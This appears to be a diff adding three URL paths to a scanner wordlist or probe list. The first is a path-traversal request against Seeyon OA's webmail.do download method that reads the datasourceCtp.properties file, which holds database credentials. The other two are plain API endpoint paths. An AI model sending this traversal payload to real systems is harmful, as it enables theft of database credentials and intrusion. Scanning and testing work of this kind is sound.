@@ -1,0 +1,3 @@
+/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+/api/v1/GetSrc
+/api/v1/GetDevice
